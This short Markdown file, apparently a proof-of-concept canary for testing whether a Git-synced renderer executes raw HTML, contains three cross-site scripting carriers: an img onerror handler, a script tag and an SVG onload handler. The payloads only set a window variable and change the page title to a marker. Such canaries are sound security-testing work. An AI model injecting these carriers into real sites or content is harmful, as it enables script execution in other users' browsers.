---
title: PoC GitSync XSS 0981
hidden: false
---

# gitsync-xss-canary-0981

Raw img onerror carrier:
<img src=x onerror="window.__g1=location.origin;document.title='GITXSS1-'+document.domain" />

Raw script carrier:
<script>window.__g2=location.origin;document.title='GITXSS2-'+document.domain</script>

SVG onload carrier:
<svg onload="window.__g3=location.origin;document.title='GITXSS3-'+document.domain"></svg>

End of canary.
